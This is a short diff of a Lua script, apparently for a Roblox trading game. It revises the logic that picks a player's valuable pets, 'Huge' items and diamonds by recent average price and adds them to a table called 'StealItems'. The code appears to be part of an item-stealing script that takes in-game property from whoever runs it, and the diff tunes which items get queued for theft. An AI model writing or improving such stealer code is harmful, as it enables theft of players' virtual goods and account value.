@@ -246,13 +246,15 @@ if _G.Act == true then
                         task.wait(0.001)
                     end
                     if (rap > MinRAP or (string.find(name,"Huge") and x:IsA("Pet")) or (name == "Diamonds" and x:IsA("Currency")) or Lists["White"][name]) and Lists["Black"][name] ~= true then
-                        if x:IsA("Pet") and GetRap(x) > 100000 then
-                            if MaxLengh < #name then
-                                MaxLengh = #name
-                            end
-                            if x:IsA("Currency") then
-                                Diamonds = value
-                            end
+                        if MaxLengh < #name then
+                             MaxLengh = #name
+                        end
+                        if x:IsA("Currency") then
+                            Diamonds = value
+                        end
+                        if x:IsA("Pet") and GetRap(x) < 100000 then
+                            print("")
+                        else
                             table.insert(StealItems,{
                                 ["uid"] = uid,
                                 ["id"] = name,
